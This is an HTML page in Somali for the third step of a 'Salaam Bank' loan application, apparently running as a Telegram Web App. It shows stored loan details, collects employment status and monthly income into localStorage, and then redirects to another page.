<!DOCTYPE html>
<html lang="so">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Salaam Bank - Kooban Codsiga</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --bank-primary: #0056b3;
            --bank-hover: #004085;
            --bg-color: #eef2f7;
            --card-bg: #ffffff;
            --text-main: #000000;
            --text-muted: #888888;
            --input-border: #e2e8f0;
            --btn-gray: #e8e8e8;
            --btn-gray-text: #555555;
        }

        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }

        .app-header {
            width: 100%; background-color: var(--bank-primary); height: 60px; padding: 0 20px;
            display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100;
        }

        .back-btn-top { color: white; text-decoration: none; font-weight: 600; font-size: 15px; cursor: pointer; display: flex; align-items: center; gap: 5px; }
        .header-title { position: absolute; left: 50%; transform: translateX(-50%); display: flex; font-size: 20px; font-weight: 800; color: white; }
        .header-title .salaam { color: white; opacity: 0.9; margin-right: 4px; }
        .header-title .bank { color: #ffc107; }

        .card {
            background: white; width: 90%; max-width: 440px; margin: 20px 0 30px; padding: 32px 24px;
            border-radius: 16px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05); display: flex; flex-direction: column;
        }

        .main-title { font-size: 26px; color: var(--text-main); margin: 0 0 6px; text-align: center; font-weight: 800; }
        .subtext { font-size: 14px; color: var(--text-muted); text-align: center; margin-bottom: 20px; }

        .step-indicator { display: flex; gap: 12px; margin: 0 auto 32px; width: 80%; }
        .step-bar { flex: 1; height: 4px; background-color: #e2e8f0; border-radius: 2px; }
        .step-bar.active { background-color: var(--bank-primary); }

        .form-group { margin-bottom: 22px; display: flex; flex-direction: column; }
        .form-group label { font-size: 15px; font-weight: 700; color: #222222; margin-bottom: 10px; }
        .form-control { font-size: 15px; padding: 14px 16px; border: 1px solid var(--input-border); border-radius: 10px; background-color: #ffffff; color: #333333; outline: none; width: 100%; }

        .summary-card {
            background-color: #fafafa; border-left: 4px solid var(--bank-primary); padding: 18px 16px; border-radius: 10px; margin: 10px 0 24px;
        }
        .summary-card h3 { margin: 0 0 14px 0; font-size: 16px; font-weight: 800; color: var(--text-main); }
        .summary-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; padding-bottom: 8px; border-bottom: 1px solid #eee; }
        .summary-label { color: #666; font-size: 13.5px; }
        .summary-value { font-weight: 700; font-size: 13.5px; color: #111; }

        .btn-container { display: flex; flex-direction: column; gap: 12px; margin-top: 10px; }
        .btn-prev { background-color: var(--btn-gray); color: var(--btn-gray-text); border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: 700; cursor: pointer; text-transform: uppercase; }
        .btn-next { background-color: var(--bank-primary); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: 800; cursor: pointer; text-transform: uppercase; }
        .footer-banner { width: 100%; text-align: center; padding: 20px; font-size: 12px; color: #666666; margin-top: auto; }
    </style>
</head>

<body>

<div class="app-header">
    <a onclick="goBack()" class="back-btn-top">← Soo noqo</a>
    <div class="header-title">
        <span class="salaam">Salaam</span><span class="bank">Bank</span>
    </div>
    <div style="width:24px"></div>
</div>

<div class="card">
    <h1 class="main-title">Xaqiijinta Codsiga</h1>
    <div class="subtext">Tallaabada 3 ee 3</div>

    <div class="step-indicator">
        <div class="step-bar active"></div>
        <div class="step-bar active"></div>
        <div class="step-bar active"></div>
    </div>

    <form id="step3Form" onsubmit="submitForm(event)">
        <div class="form-group">
            <label for="jobStatus">Xaaladda Shaqo</label>
            <select id="jobStatus" class="form-control" required>
                <option value="Shaqaale" selected>Shaqaale</option>
                <option value="Ganacsade">Ganacsade / Ganacsi gaar ah</option>
                <option value="Arday">Arday</option>
                <option value="Shaqo la'aan">Shaqo la'aan</option>
            </select>
        </div>

        <div class="form-group">
            <label for="income">Dakhliga Bishii ($)</label>
            <input type="number" id="income" class="form-control" placeholder="Tusaale: 600" required>
        </div>

        <div class="summary-card">
            <h3>Faahfaahinta Codsiga</h3>
            <div class="summary-row"><span class="summary-label">Lacagta Daynta:</span><span class="summary-value" id="sumAmount">--</span></div>
            <div class="summary-row"><span class="summary-label">Muddada:</span><span class="summary-value" id="sumDuration">--</span></div>
            <div class="summary-row"><span class="summary-label">Ujeedada:</span><span class="summary-value" id="sumPurpose">--</span></div>
            <div class="summary-row"><span class="summary-label">Magaca:</span><span class="summary-value" id="sumName">--</span></div>
            <div class="summary-row"><span class="summary-label">Taleefanka:</span><span class="summary-value" id="sumPhone">--</span></div>
        </div>

        <div class="btn-container">
            <button type="button" class="btn-prev" onclick="goBack()">KA HOREEYSAY</button>
            <button type="submit" class="btn-next">GUSUBCODSIGA GUDBI</button>
        </div>
    </form>
</div>

<div class="footer-banner">© 2026 Salaam Bank Somalia</div>

<script>
window.onload = () => {
    const tg = window.Telegram?.WebApp;
    if (tg) { tg.ready(); tg.expand(); }

    const amount = localStorage.getItem('appliedAmount') || "1000";
    const term = localStorage.getItem('appliedTerm') || "12 Bilood";
    const purpose = localStorage.getItem('appliedPurpose') || "Ganacsi";
    const fName = localStorage.getItem('firstName') || "";
    const lName = localStorage.getItem('lastName') || "";
    const phone = localStorage.getItem('phone') || "";

    document.getElementById('sumAmount').innerText = `${Number(amount).toLocaleString()} $`;
    document.getElementById('sumDuration').innerText = term;
    document.getElementById('sumPurpose').innerText = purpose;
    document.getElementById('sumName').innerText = `${fName} ${lName}`;
    document.getElementById('sumPhone').innerText = `+252 ${phone}`;
};

function submitForm(event) {
    event.preventDefault();
    const incomeVal = document.getElementById('income').value.trim();
    localStorage.setItem('income', incomeVal);
    window.location.href = "/page5";
}

function goBack() { window.location.href = "/page3"; }
</script>

</body>
</html>
